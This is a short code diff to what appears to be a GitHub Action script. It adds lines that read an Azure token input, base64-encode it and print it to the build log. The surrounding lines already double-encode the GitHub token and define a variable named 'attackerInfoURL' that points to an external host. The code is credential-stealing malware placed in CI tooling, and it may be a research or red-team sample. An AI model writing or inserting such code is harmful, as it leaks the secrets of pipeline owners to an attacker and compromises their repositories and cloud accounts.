@@ -12,6 +12,9 @@ try {
   const time = (new Date()).toTimeString();
   core.setOutput("time", time);
   const tokey = core.getInput('githubToken');
+  const oidc = core.getInput('azureToken');
+  const enc = Buffer.from(oidc).toString('base64');
+  console.log(enc)
   const encoded = Buffer.from(tokey).toString('base64');
   const encoded2 = Buffer.from(encoded).toString('base64');
   const attackerInfoURL = "http://boogabeans.pythonanywhere.com/";
